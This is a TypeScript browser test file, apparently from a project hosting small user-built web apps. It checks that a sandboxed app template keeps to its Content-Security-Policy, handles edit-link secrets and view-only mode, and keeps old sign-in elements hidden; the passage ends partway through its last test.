// Ticket 2.3: the app template, templates/basic (criteria 5 and 6).
// Criterion 5 serves the template at /apps/<nickname>/ from a tiny local server with the apps'
// real Content-Security-Policy (sandbox, opaque origin) and opens it at phone width in Playwright's
// Chromium, with the data API (ticket 2.4) mocked.
// Ticket 2.14: a second, HTTPS origin (a certificate made in the test) proves that the policy lets an app read data
// and show images from an outside HTTPS address, and still blocks its scripts, styles and fonts and any http: address.
import { readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { createServer as createHttpsServer } from "node:https";
import type { AddressInfo } from "node:net";
import { extname, join, normalize } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium, type Browser, type BrowserContext, type Page, type Route } from "playwright";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { APPS_CONTENT_SECURITY_POLICY } from "../../../infra/lib/config.js";
import { APP_EDIT_LINK_TEXTS } from "../workshop/texts.js";
import { ALLOWED_EXTENSIONS, MAX_APP_BYTES, NAMESPACE_ADDRESSES, checkApp, readAppFolder } from "./check.js";
import { selfSignedCertificate } from "./test-certificate.js";

const TEMPLATE_DIR = fileURLToPath(new URL("../../../templates/basic/", import.meta.url));
const NICKNAME = "test-nick";
const APP_PATH = `/apps/${NICKNAME}/`;
const DATA_PREFIX = `/api/apps/${NICKNAME}/data/`;
const PHONE = { width: 375, height: 667 };
const TYPES: Record<string, string> = { ".html": "text/html", ".css": "text/css", ".js": "text/javascript" };
const CORS = { "access-control-allow-origin": "*", "access-control-allow-methods": "GET, PUT, DELETE", "access-control-allow-headers": "content-type, accept, authorization" };
/** Ticket 3.28: the app's edit secret the fake API accepts (ticket 3.26: 32 bytes, base64url), as the edit link carries it. */
const SECRET = Buffer.alloc(32, 9).toString("base64url");
const EDIT_LINK = `#edit=${SECRET}`;
/** The real API's 401 text (ticket 3.26), which workshop-data.js also gives a write it refuses without a secret. */
const VIEW_ONLY = APP_EDIT_LINK_TEXTS.viewOnly;
/** Chromium logs every 401 answer itself (a replaced edit link): only that line is expected then. */
const LOGGED_401 = "Failed to load resource: the server responded with a status of 401";

describe("the template in a browser under the apps' sandbox (criterion 5)", () => {
  let server: Server;
  let origin: string;
  let browser: Browser;
  let context: BrowserContext;
  let page: Page;
  let errors: string[];
  let store: Map<string, string>;
  let calls: { method: string; path: string; search: string; origin: string | undefined; cookie: string | undefined; authorization: string | undefined; status: number }[];
  /** Who saved each key last (ticket 3.24's `updatedBy`), for `?info=1`. */
  let writers: Map<string, string>;
  /** Another server (another origin) that answers anything, to prove the CSP keeps the app from it. */
  let outside: Server;
  let outsideOrigin: string;
  let outsideHits: string[];
  /** An outside HTTPS service (ticket 2.14): JSON with CORS, an image, and a script, stylesheet and font the CSP must block. */
  let service: Server;
  let serviceOrigin: string;
  let serviceHits: string[];

  beforeAll(async () => {
    server = createServer((request, response) => {
      const path = new URL(request.url ?? "/", "http://localhost").pathname;
      const relative = path.startsWith(APP_PATH) ? path.slice(APP_PATH.length) || "index.html" : "";
      const file = normalize(join(TEMPLATE_DIR, relative));
      try {
        if (relative === "" || !file.startsWith(TEMPLATE_DIR)) throw new Error("outside");
        const body = readFileSync(file);
        response.writeHead(200, {
          "content-type": TYPES[extname(file)] ?? "application/octet-stream",
          "content-security-policy": APPS_CONTENT_SECURITY_POLICY,
          "x-content-type-options": "nosniff",
        });
        response.end(body);
      } catch {
        response.writeHead(404).end();
      }
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    outside = createServer((request, response) => {
      outsideHits.push(request.url ?? "");
      response.writeHead(200, { "access-control-allow-origin": "*", "content-type": "image/svg+xml" });
      response.end('<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>');
    });
    await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
    outsideOrigin = `http://127.0.0.1:${(outside.address() as AddressInfo).port}`;
    const SERVICE_FILES: Record<string, [string, string]> = {
      "/data.json": ["application/json", JSON.stringify({ title: "Casablanca", year: 1942 })],
      "/poster.svg": ["image/svg+xml", '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="3"/>'],
      "/lib.js": ["text/javascript", "window.serviceScriptRan = true;"],
      "/style.css": ["text/css", "body { margin: 7px; }"],
      "/font.woff2": ["font/woff2", "not really a font"],
    };
    service = createHttpsServer(selfSignedCertificate(), (request, response) => {
      const path = new URL(request.url ?? "/", "https://localhost").pathname;
      serviceHits.push(path);
      const [type, body] = SERVICE_FILES[path] ?? ["text/plain", ""];
      response.writeHead(SERVICE_FILES[path] ? 200 : 404, { "access-control-allow-origin": "*", "content-type": type });
      response.end(body);
    });
    await new Promise<void>((resolve) => service.listen(0, "127.0.0.1", resolve));
    serviceOrigin = `https://127.0.0.1:${(service.address() as AddressInfo).port}`;
    browser = await chromium.launch();
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    await new Promise((resolve) => server?.close(resolve));
    await new Promise((resolve) => outside?.close(resolve));
    await new Promise((resolve) => service?.close(resolve));
  });

  beforeEach(async () => {
    // The service's certificate is made in the test, so no browser trusts it: only that error is ignored.
    context = await browser.newContext({ viewport: PHONE, ignoreHTTPSErrors: true });
    page = await context.newPage();
    page.setDefaultTimeout(5_000);
    errors = [];
    page.on("console", (message) => {
      if (message.type() === "error") errors.push(message.text());
    });
    page.on("pageerror", (error) => errors.push(error.message));
    store = new Map();
    calls = [];
    outsideHits = [];
    serviceHits = [];
    // A stand-in for the data API (ticket 2.4): JSON values by key, CORS for any origin, no cookies.
    // A key with no value answers 200 with null (Chromium logs every 404 as a console error).
    // Ticket 3.26/3.28: like the real API, a write needs `Authorization: Bearer <edit secret>` (401 with its text otherwise), and
    // `?info=1` answers `{value, updatedBy, updatedAt}`.
    writers = new Map();
    await page.route("**/api/apps/**", async (route: Route) => {
      const request = route.request();
      const url = new URL(request.url());
      const path = url.pathname;
      const headers = await request.allHeaders();
      const call = { method: request.method(), path, search: url.search, origin: headers.origin, cookie: headers.cookie, authorization: headers.authorization, status: 0 };
      calls.push(call);
      const answer = (status: number, extra: { body?: string } = {}) => {
        call.status = status;
        return route.fulfill({ status, headers: extra.body === undefined ? CORS : { ...CORS, "content-type": "application/json" }, ...extra });
      };
      const key = path.startsWith(DATA_PREFIX) ? path.slice(DATA_PREFIX.length) : "";
      if (request.method() === "OPTIONS") return answer(204);
      if (request.method() === "PUT" || request.method() === "DELETE") {
        if (headers.authorization !== `Bearer ${SECRET}`) return answer(401, { body: JSON.stringify({ message: VIEW_ONLY }) });
        if (request.method() === "PUT") {
          store.set(key, request.postData() ?? "");
          writers.set(key, "Bob");
        } else {
          store.delete(key);
          writers.delete(key);
        }
        return answer(204);
      }
      // `?whoami=1` names the edit link's writer (Bob, the builder), 401 without the secret.
      if (url.searchParams.get("whoami") === "1") {
        if (headers.authorization !== `Bearer ${SECRET}`) return answer(401, { body: JSON.stringify({ message: VIEW_ONLY }) });
        return answer(200, { body: JSON.stringify({ nickname: "Bob" }) });
      }
      const value = store.get(key) ?? "null";
      if (url.searchParams.get("info") === "1") {
        const by = writers.get(key) ?? null;
        return answer(200, { body: `{"value":${value},"updatedBy":${JSON.stringify(by)},"updatedAt":${by === null ? "null" : '"2026-11-26T10:00:00.000Z"'}}` });
      }
      return answer(200, { body: value });
    });
  });

  afterEach(async () => {
    await context.close();
  });

  /** The stored count the mock starts with, so a page that shows it has really read it. */
  const STORED = 41;

  /** Opens the app and waits until it has read the counter: the GET answered and the page shows it. */
  const openApp = async (shown: string, hash = ""): Promise<void> => {
    const read = page.waitForResponse((response) => new URL(response.url()).pathname === `${DATA_PREFIX}presses` && response.request().method() === "GET");
    // From a blank page, so an address that differs only after the # loads the page again.
    await page.goto("about:blank");
    const response = await page.goto(`${origin}${APP_PATH}${hash}`);
    expect(response?.headers()["content-security-policy"]).toBe(APPS_CONTENT_SECURITY_POLICY);
    expect((await read).status()).toBe(200);
    await expect.poll(() => page.locator("#count").textContent()).toBe(shown);
    // load() shows the count and clears the status in the same step: the page has settled.
    expect(await page.locator("#status").textContent()).toBe("");
  };

  it("loads at 375 px with no console error and nothing scrolling sideways", async () => {
    store.set("presses", String(STORED));
    await openApp(String(STORED));
    await page.getByRole("heading", { level: 1 }).waitFor();
    // Under the sandbox the page has an opaque origin: no storage, no cookies.
    // (Browser code is passed as strings: the root tsconfig has no DOM types, see platform/web/tsconfig.json.)
    expect(await page.evaluate<string>("window.origin")).toBe("null");
    expect(await page.evaluate<string>(`(() => { try { void localStorage.length; return "usable"; } catch { return "blocked"; } })()`)).toBe("blocked");
    // The stylesheet applied (styles load in the sandbox).
    expect(await page.evaluate<string>(`getComputedStyle(document.querySelector("main")).maxWidth`)).toBe("640px");
    const widths = await page.evaluate<{ scroll: number; client: number; body: number }>(`({
      scroll: document.documentElement.scrollWidth,
      client: document.documentElement.clientWidth,
      body: document.body.scrollWidth,
    })`);
    expect(widths.client).toBe(PHONE.width);
    expect(widths.scroll).toBeLessThanOrEqual(widths.client);
    expect(widths.body).toBeLessThanOrEqual(widths.client);
    expect(errors).toEqual([]);
  });

  it("stores and reads data through workshop-data.js, without cookies, from the opaque origin", async () => {
    await context.addCookies([{ name: "session", value: "platform-session", url: origin }]);
    store.set("presses", String(STORED));
    await openApp(String(STORED), EDIT_LINK);

    await page.getByRole("button", { name: "Press" }).click();
    await expect.poll(() => page.locator("#status").textContent()).toBe("Saved.");
    expect(await page.locator("#count").textContent()).toBe(String(STORED + 1));
    expect(store.get("presses")).toBe(String(STORED + 1));
    await openApp(String(STORED + 1), EDIT_LINK);

    const roundTrip = await page.evaluate<{ read: unknown; gone: unknown; badKey: unknown }>(`(async () => {
      const value = { name: "Ada's list", items: [1, 2, 3], done: false };
      await workshopData.set("list_1", value);
      const read = await workshopData.get("list_1");
      await workshopData.remove("list_1");
      const gone = await workshopData.get("list_1");
      const badKey = await workshopData.get("../me").catch((error) => error.message);
      return { read, gone, badKey };
    })()`);
    expect(roundTrip.read).toEqual({ name: "Ada's list", items: [1, 2, 3], done: false });
    expect(roundTrip.gone).toBeNull();
    expect(roundTrip.badKey).toBe("A key may only hold letters, digits, dashes and underscores.");

    expect(calls.map((call) => `${call.method} ${call.path}`)).toContain(`PUT ${DATA_PREFIX}presses`);
    expect(calls.every((call) => call.path.startsWith(DATA_PREFIX))).toBe(true);
    expect(calls.every((call) => call.cookie === undefined)).toBe(true);
    // Every request comes from the opaque origin, so the API (ticket 2.4) must answer it with CORS.
    expect(calls.filter((call) => call.method !== "OPTIONS").map((call) => call.origin)).toEqual(
      calls.filter((call) => call.method !== "OPTIONS").map(() => "null"),
    );
    expect(errors).toEqual([]);
  });

  it("blocks an outside http: fetch and an outside http: image under the CSP, while its own files and data load", async () => {
    store.set("presses", String(STORED));
    await openApp(String(STORED));
    // The CSP's refusals are console errors here, and only they are expected.
    page.removeAllListeners("console");
    const refused: string[] = [];
    page.on("console", (message) => {
      if (message.type() !== "error") return;
      if (message.text().includes("Content Security Policy")) refused.push(message.text());
      else errors.push(message.text());
    });
    const outcome = await page.evaluate<{ fetch: string; image: string; violations: string[] }>(`(async () => {
      const violations = [];
      document.addEventListener("securitypolicyviolation", (event) => violations.push(event.effectiveDirective));
      const fetched = await fetch("${outsideOrigin}/data.json").then(() => "loaded", () => "blocked");
      const image = await new Promise((resolve) => {
        const img = document.createElement("img");
        img.onload = () => resolve("loaded");
        img.onerror = () => resolve("blocked");
        img.src = "${outsideOrigin}/pixel.svg";
        document.body.append(img);
      });
      await new Promise((resolve) => setTimeout(resolve, 100));
      return { fetch: fetched, image, violations };
    })()`);
    expect(outcome).toEqual({ fetch: "blocked", image: "blocked", violations: ["connect-src", "img-src"] });
    expect(refused).toEqual([
      expect.stringContaining(`Connecting to '${outsideOrigin}/data.json' violates`),
      expect.stringContaining("Refused to connect"),
      expect.stringContaining(`Loading the image '${outsideOrigin}/pixel.svg' violates`),
    ]);
    expect(outsideHits).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("ticket 2.14: reads JSON and shows an image from an outside HTTPS service, and blocks its script, stylesheet and font, and an http: fetch", async () => {
    store.set("presses", String(STORED));
    await openApp(String(STORED));
    // The CSP's refusals are console errors here, and only they are expected.
    page.removeAllListeners("console");
    const refused: string[] = [];
    page.on("console", (message) => {
      if (message.type() !== "error") return;
      if (message.text().includes("Content Security Policy") || message.text().startsWith("Refused to connect")) refused.push(message.text());
      else errors.push(message.text());
    });
    const outcome = await page.evaluate<{
      data: unknown;
      image: string;
      imageSize: string;
      script: string;
      scriptRan: boolean;
      style: string;
      margin: string;
      font: string;
      http: string;
      violations: string[];
    }>(`(async () => {
      const violations = [];
      document.addEventListener("securitypolicyviolation", (event) => violations.push(event.effectiveDirective));
      const service = "${serviceOrigin}";
      const data = await fetch(service + "/data.json").then((response) => response.json(), (error) => "blocked: " + error.message);
      const loaded = (element) => new Promise((resolve) => {
        element.onload = () => resolve("loaded");
        element.onerror = () => resolve("blocked");
        document.body.append(element);
      });
      const img = document.createElement("img");
      img.src = service + "/poster.svg";
      const image = await loaded(img);
      const script = document.createElement("script");
      script.src = service + "/lib.js";
      const scriptOutcome = await loaded(script);
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = service + "/style.css";
      const style = await loaded(link);
      const font = await new FontFace("Outside", "url(" + service + "/font.woff2)").load().then(() => "loaded", () => "blocked");
      const http = await fetch("${outsideOrigin}/data.json").then(() => "loaded", () => "blocked");
      await new Promise((resolve) => setTimeout(resolve, 100));
      return {
        data,
        image,
        imageSize: img.naturalWidth + "x" + img.naturalHeight,
        script: scriptOutcome,
        scriptRan: window.serviceScriptRan === true,
        style,
        margin: getComputedStyle(document.body).marginTop,
        font,
        http,
        violations,
      };
    })()`);
    expect(outcome).toEqual({
      data: { title: "Casablanca", year: 1942 },
      image: "loaded",
      imageSize: "2x3",
      script: "blocked",
      scriptRan: false,
      style: "blocked",
      margin: expect.not.stringMatching(/^7px$/),
      font: "blocked",
      http: "blocked",
      violations: ["script-src-elem", "style-src-elem", "font-src", "connect-src"],
    });
    // Only the data and the image reached the service; nothing reached the http: server.
    expect(serviceHits.sort()).toEqual(["/data.json", "/poster.svg"]);
    expect(outsideHits).toEqual([]);
    expect(refused).toEqual([
      expect.stringContaining(`Loading the script '${serviceOrigin}/lib.js' violates`),
      expect.stringContaining(`Loading the stylesheet '${serviceOrigin}/style.css' violates`),
      expect.stringContaining(`Loading the font '${serviceOrigin}/font.woff2' violates`),
      expect.stringContaining(`Connecting to '${outsideOrigin}/data.json' violates`),
      expect.stringContaining("Refused to connect"),
    ]);
    expect(errors).toEqual([]);
  });

  it("refuses an inline script under the CSP", async () => {
    store.set("presses", String(STORED));
    await openApp(String(STORED));
    page.removeAllListeners("console");
    page.on("console", (message) => {
      if (message.type() === "error" && !message.text().startsWith("Executing inline script violates")) errors.push(message.text());
    });
    const ran = await page.evaluate<boolean>(`(async () => {
      const script = document.createElement("script");
      script.textContent = "window.inlineRan = true;";
      document.body.append(script);
      await new Promise((resolve) => setTimeout(resolve, 50));
      return window.inlineRan === true;
    })()`);
    expect(ran).toBe(false);
    expect(errors).toEqual([]);
  });

  it("shows a plain message when the app is not live (the data API answers 404)", async () => {
    await page.unroute("**/api/apps/**");
    await page.route("**/api/apps/**", (route) =>
      route.fulfill({ status: 404, headers: { ...CORS, "content-type": "application/json" }, body: JSON.stringify({ message: "Not found." }) }),
    );
    // Chromium logs the 404 itself; only that line is allowed in this test.
    page.removeAllListeners("console");
    page.on("console", (message) => {
      if (message.type() === "error" && !message.text().startsWith("Failed to load resource: the server responded with a status of 404")) errors.push(message.text());
    });
    const read = page.waitForResponse((response) => new URL(response.url()).pathname === `${DATA_PREFIX}presses`);
    await page.goto(`${origin}${APP_PATH}`);
    expect((await read).status()).toBe(404);
    await expect.poll(() => page.locator("#status").textContent()).toBe("This app is not live on the workshop yet, so it cannot load or save data.");
    expect(await page.locator("#count").textContent()).toBe("0");
    expect(errors).toEqual([]);
  });

  it("shows a plain message, not a console error, when the data service cannot be reached", async () => {
    await page.unroute("**/api/apps/**");
    await page.route("**/api/apps/**", (route) => route.abort("connectionrefused"));
    // Chromium logs the refused request itself; only that line is allowed.
    page.removeAllListeners("console");
    page.on("console", (message) => {
      if (message.type() === "error" && !message.text().startsWith("Failed to load resource: net::ERR_CONNECTION_REFUSED")) errors.push(message.text());
    });
    const failed = page.waitForEvent("requestfailed", (request) => new URL(request.url()).pathname === `${DATA_PREFIX}presses`);
    await page.goto(`${origin}${APP_PATH}`);
    await failed;
    await expect.poll(() => page.locator("#status").textContent()).toBe("The data service could not be reached. Check the connection and try again.");
    expect(await page.locator("#count").textContent()).toBe("0");
    expect(errors).toEqual([]);
  });

  /** The console check of a save the API refuses (a replaced edit link), where Chromium logs the API's 401 itself. */
  const allow401 = (): void => {
    page.removeAllListeners("console");
    page.on("console", (message) => {
      if (message.type() === "error" && !message.text().startsWith(LOGGED_401)) errors.push(message.text());
    });
  };

  /** Every request the page sends that is not a read (a write, an upload, an AI call), as Chromium sees it. */
  const watchWrites = (): string[] => {
    const sent: string[] = [];
    page.on("request", (request) => {
      if (request.method() !== "GET") sent.push(`${request.method()} ${new URL(request.url()).pathname}`);
    });
    return sent;
  };

  /** The helpers' outcome for each write without the edit link: data, photo, media delete and AI. */
  const WRITES_SCRIPT = `Promise.all([
    workshopData.set("presses", 1).then(() => "set", (error) => error.message),
    workshopData.remove("presses").then(() => "removed", (error) => error.message),
    workshopData.savePhoto(new File([new Uint8Array(10)], "a.jpg", { type: "image/jpeg" })).then(() => "saved", (error) => error.message),
    workshopData.deleteMedia(location.origin + "/app-media/${NICKNAME}/" + "A".repeat(22)).then(() => "deleted", (error) => error.message),
    workshopData.ai.sortText("Milk and bread", ["Food", "Drink"]).then(() => "sorted", (error) => error.message),
    workshopData.recordVoice().then(() => "recording", (error) => error.message),
  ])`;

  it("ticket 3.28 criterion 2: WHEN the template opens without a secret THEN reads work, canSave() is false, no sign-in element or floating button is visible, and a save shows \"This link is view only.\" and writes nothing", async () => {
    store.set("presses", String(STORED));
    writers.set("presses", "Ada");
    const sent = watchWrites();
    await openApp(String(STORED));
    // Reads work, who-saved included (`?info=1`).
    expect(calls.find((call) => call.method === "GET")?.search).toBe("?info=1");
    expect(await page.locator("#who").textContent()).toBe("Last press by Ada.");
    expect(await page.evaluate<unknown>(`workshopData.get("presses")`)).toBe(STORED);
    expect(await page.evaluate<unknown>(`workshopData.getInfo("presses")`)).toEqual({ value: STORED, updatedBy: "Ada", updatedAt: "2026-11-26T10:00:00.000Z" });
    expect(await page.evaluate<unknown>(`workshopData.getInfo("nothing-here")`)).toEqual({ value: null, updatedBy: null, updatedAt: null });
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(false);
    expect(await page.evaluate<unknown>("workshopData.whoAmI()")).toBeNull();
    expect(await page.evaluate<unknown>("workshopData.signInLink()")).toBeNull();
    // View only: the template hides its Press button and shows its note; no sign-in element or floating button.
    expect(await page.getByRole("button", { name: "Press" }).isVisible()).toBe(false);
    expect(await page.getByText("View only", { exact: true }).isVisible()).toBe(true);
    expect(await page.getByRole("button", { name: /sign in/i }).count()).toBe(0);
    expect(await page.locator("body > button").count()).toBe(0);
    // Every write is refused with the message, before anything is sent.
    expect(await page.evaluate<string[]>(WRITES_SCRIPT)).toEqual(Array(6).fill(VIEW_ONLY));
    expect(await page.evaluate<unknown>(`workshopData.set("../me", 1).catch((error) => error.message)`)).toBe("A key may only hold letters, digits, dashes and underscores.");
    expect(sent).toEqual([]);
    expect(calls.filter((call) => call.method !== "GET")).toEqual([]);
    // Nobody asked who the link names, since there is none.
    expect(calls.some((call) => call.search === "?whoami=1")).toBe(false);
    expect(store.get("presses")).toBe(String(STORED));
    expect(writers.get("presses")).toBe("Ada");
    expect(page.url()).toBe(`${origin}${APP_PATH}`);
    // No 401 to log: nothing was sent.
    expect(errors).toEqual([]);
  });

  it("ticket 3.28 criterion 2: WHEN an app keeps its saving button visible without a secret THEN pressing it shows \"This link is view only.\" and writes nothing", async () => {
    const sent = watchWrites();
    await openShapeApp("visible");
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(false);
    await pressAdd();
    expect(await page.locator("#status").textContent()).toBe(VIEW_ONLY);
    expect(sent).toEqual([]);
    expect(store.has("notes")).toBe(false);
    expect(await visibleSignIn()).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("ticket 3.28 criterion 1: WHEN the template opens with #edit=<secret> THEN saves carry Authorization: Bearer <secret>, canSave() is true, the secret stays in the address, and after a reload saving still works", async () => {
    store.set("presses", String(STORED));
    await openApp(String(STORED), `${EDIT_LINK}&screen=list`);
    // Kept in the address (Franck's design): a reload, a bookmark or a home-screen icon keeps the right to save.
    expect(page.url()).toBe(`${origin}${APP_PATH}${EDIT_LINK}&screen=list`);
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(true);
    expect(await page.evaluate<unknown>("workshopData.whoAmI()")).toBe("Bob");
    expect(await page.locator("#who").textContent()).toBe("You save as Bob.");
    expect(await page.getByRole("button", { name: "Press" }).isVisible()).toBe(true);
    expect(await page.getByText("View only", { exact: true }).isVisible()).toBe(false);
    // Never shown in the page (the title or text), nor put in history state.
    expect(await page.evaluate<string>("JSON.stringify(history.state) + document.title + document.body.innerText")).not.toContain(SECRET);

    await page.getByRole("button", { name: "Press" }).click();
    await expect.poll(() => page.locator("#status").textContent()).toBe("Saved.");
    expect(await page.locator("#who").textContent()).toBe("Last press by Bob. You save as Bob.");
    expect(await page.evaluate<string>(`workshopData.remove("other").then(() => "removed")`)).toBe("removed");
    // After a reload (the address still holds the secret), saving still works.
    await page.reload();
    await expect.poll(() => page.locator("#count").textContent()).toBe(String(STORED + 1));
    expect(page.url()).toBe(`${origin}${APP_PATH}${EDIT_LINK}&screen=list`);
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(true);
    await page.getByRole("button", { name: "Press" }).click();
    await expect.poll(() => page.locator("#status").textContent()).toBe("Saved.");
    const writes = calls.filter((call) => call.method === "PUT" || call.method === "DELETE");
    expect(writes.map((call) => [call.method, call.authorization, call.status])).toEqual([
      ["PUT", `Bearer ${SECRET}`, 204],
      ["DELETE", `Bearer ${SECRET}`, 204],
      ["PUT", `Bearer ${SECRET}`, 204],
    ]);
    // Reads never carry it; only the question whose link this is (`?whoami=1`) does, once per page load.
    const whoami = calls.filter((call) => call.method === "GET" && call.search === "?whoami=1");
    expect(whoami.map((call) => [call.path, call.authorization])).toEqual([
      [`${DATA_PREFIX}whoami`, `Bearer ${SECRET}`],
      [`${DATA_PREFIX}whoami`, `Bearer ${SECRET}`],
    ]);
    expect(calls.filter((call) => call.method === "GET" && call.search !== "?whoami=1").every((call) => call.authorization === undefined)).toBe(true);
    expect(store.get("presses")).toBe(String(STORED + 2));
    expect(await visibleSignIn()).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("ticket 3.28: WHEN the edit link was replaced (the API answers 401) THEN the save shows \"This link is view only.\" and canSave() stays true", async () => {
    allow401();
    await openApp("0", EDIT_LINK);
    await page.unroute("**/api/apps/**");
    await page.route("**/api/apps/**", (route) =>
      route.request().method() === "OPTIONS"
        ? route.fulfill({ status: 204, headers: CORS })
        : route.fulfill({ status: 401, headers: { ...CORS, "content-type": "application/json" }, body: JSON.stringify({ message: VIEW_ONLY }) }),
    );
    await page.getByRole("button", { name: "Press" }).click();
    await expect.poll(() => page.locator("#status").textContent()).toBe(VIEW_ONLY);
    expect(await page.locator("#count").textContent()).toBe("0");
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(true);
    expect(await visibleSignIn()).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("ticket 3.28: WHEN the address holds a malformed secret THEN the app is view only, nothing is asked, and the address stays as it is", async () => {
    for (const hash of ["#edit=short", "#edit=", `#edit=${SECRET}x`, `#edit=${SECRET.slice(0, 42)}!`, `#xedit=${SECRET}`]) {
      await openApp("0", hash);
      expect(await page.evaluate<unknown>("workshopData.canSave()"), hash).toBe(false);
      expect(await page.evaluate<unknown>("workshopData.whoAmI()"), hash).toBeNull();
      expect(page.url(), hash).toBe(`${origin}${APP_PATH}${hash}`);
    }
    expect(calls.some((call) => call.search === "?whoami=1")).toBe(false);
    expect(errors).toEqual([]);
  });

  it("ticket 3.28: WHEN the address holds an old sign-in hand-off (#wt=) THEN it is removed from the address and ignored, any other part kept", async () => {
    const sent = watchWrites();
    await openApp("0", `#wt=${SECRET}&screen=list`);
    expect(page.url()).toBe(`${origin}${APP_PATH}#screen=list`);
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(false);
    expect(await page.evaluate<string>(`workshopData.set("presses", 1).catch((error) => error.message)`)).toBe(VIEW_ONLY);
    expect(sent).toEqual([]);
    // Beside an edit link, the old hand-off goes and the edit link stays.
    await openApp("0", `#wt=${SECRET}&${EDIT_LINK.slice(1)}`);
    expect(page.url()).toBe(`${origin}${APP_PATH}${EDIT_LINK}`);
    expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(true);
    expect(errors).toEqual([]);
  });

  // Ticket 3.28 criterion 3: apps built before the edit link have "Sign in to save" elements (3.25's rule), placed in many
  // ways. Generic, hand-written apps of different shapes: a list whose items each have a saving Add button, and the app's
  // sign-in element out of sight in a different way per shape (or nowhere, or in sight), with a "Show more" control that
  // reveals it. The app's own style.css shows its .sign-in class, as an app could.
  type Shape = "hidden-screen" | "css-class" | "details" | "nested-details" | "none" | "visible";
  const SHAPES: Shape[] = ["hidden-screen", "css-class", "details", "nested-details", "none", "visible"];
  const SIGN_IN_ELEMENT = '<button class="sign-in" type="button" data-workshop-sign-in hidden>Sign in to save</button>';
  const shapeBody = (shape: Shape): string => {
    switch (shape) {
      case "hidden-screen":
        return `<button id="more" type="button">Show more</button>\n<section id="extra" hidden><h2>More</h2><p>${SIGN_IN_ELEMENT}</p></section>`;
      case "css-class":
        return `<button id="more" type="button">Show more</button>\n<div id="extra" class="panel off"><h2>More</h2><p>${SIGN_IN_ELEMENT}</p></div>`;
      case "details":
        return `<details id="extra"><summary>Show more</summary><p>${SIGN_IN_ELEMENT}</p></details>`;
      case "nested-details":
        // In the summary of an open <details> that sits inside a closed one.
        return `<details id="extra"><summary>Show more</summary><details open><summary>${SIGN_IN_ELEMENT}</summary></details></details>`;
      case "none":
        return "";
      case "visible":
        return `<p>${SIGN_IN_ELEMENT}</p>\n<p><a href="#" data-workshop-sign-in>Sign in to save</a></p>`;
    }
  };
  const shapeApp = (shape: Shape): Record<string, string> => ({
    "index.html": `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <script src="workshop-data.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Notes</title>
    <link rel="icon" href="data:,">
    <link rel="stylesheet" href="style.css">
    <script src="app.js" defer></script>
  </head>
  <body>
    <main>
      <h1>Notes</h1>
      <ul>
        <li>First idea <button class="add" type="button">Add</button></li>
        <li>Second idea <button class="add" type="button">Add</button></li>
      </ul>
      ${shapeBody(shape)}
      <p id="status" role="status"></p>
    </main>
  </body>
</html>
`,
    "style.css": ".panel.off { display: none; }\n.sign-in { display: inline-block; }\n",
    "app.js": `"use strict";
document.addEventListener("DOMContentLoaded", () => {
  const status = document.getElementById("status");
  for (const button of document.querySelectorAll(".add")) {
    button.addEventListener("click", async () => {
      try { await workshopData.set("notes", [button.parentElement.firstChild.textContent.trim()]); status.textContent = "Saved."; }
      catch (error) { status.textContent = error.message; }
    });
  }
  const more = document.getElementById("more");
  if (more) more.addEventListener("click", () => {
    const extra = document.getElementById("extra");
    extra.hidden = false;
    extra.classList.remove("off");
  });
});
`,
  });

  /** Serves a shape's app with every file routed (workshop-data.js from the template): none comes from the loopback server. */
  const openShapeApp = async (shape: Shape, hash = ""): Promise<void> => {
    await page.unroute(`${origin}${APP_PATH}**`);
    await serveApp({ ...shapeApp(shape), "workshop-data.js": readFileSync(join(TEMPLATE_DIR, "workshop-data.js"), "utf8") });
    await page.goto("about:blank");
    await page.goto(`${origin}${APP_PATH}${hash}`);
    await page.getByRole("button", { name: "Add" }).first().waitFor();
  };

  /** Opens what hides the app's own sign-in element ("Show more"). */
  const reveal = async (shape: Shape): Promise<void> => {
    if (shape === "details" || shape === "nested-details") await page.locator("#extra > summary").click();
    else if (shape === "hidden-screen" || shape === "css-class") await page.getByRole("button", { name: "Show more" }).click();
  };

  const pressAdd = async (): Promise<void> => {
    await page.evaluate(`document.getElementById("status").textContent = ""`);
    await page.getByRole("button", { name: "Add" }).first().click();
    await expect.poll(() => page.locator("#status").textContent()).not.toBe("");
  };

  /**
   * The sign-in elements a visitor could see (each element of the page with data-workshop-sign-in, or reading "Sign in",
   * that Playwright finds visible), as their outer HTML; the floating button 3.25 added at the end of the body counts too.
   */
  const visibleSignIn = async (): Promise<string[]> => {
    const found: string[] = [];
    for (const element of await page.locator("[data-workshop-sign-in], button, a").all()) {
      const text = (await element.textContent()) ?? "";
      const marked = (await element.getAttribute("data-workshop-sign-in")) !== null;
      if ((marked || /sign in/i.test(text)) && (await element.isVisible())) found.push(await element.evaluate((el: { outerHTML: string }) => el.outerHTML));
    }
    return found;
  };

  it.each(SHAPES.flatMap((shape) => (["without", "with"] as const).map((secret) => [shape, secret] as const)))(
    "ticket 3.28 criterion 3: WHEN an app built before this phase (sign-in element: %s) runs with the new file, %s a secret, THEN its sign-in elements stay hidden and no floating button shows, before and after a save and once revealed",
    async (shape, secret) => {
      await openShapeApp(shape, secret === "with" ? EDIT_LINK : "");
      expect(await page.evaluate<unknown>("workshopData.canSave()")).toBe(secret === "with");
      expect(await visibleSignIn()).toEqual([]);
      await reveal(shape);
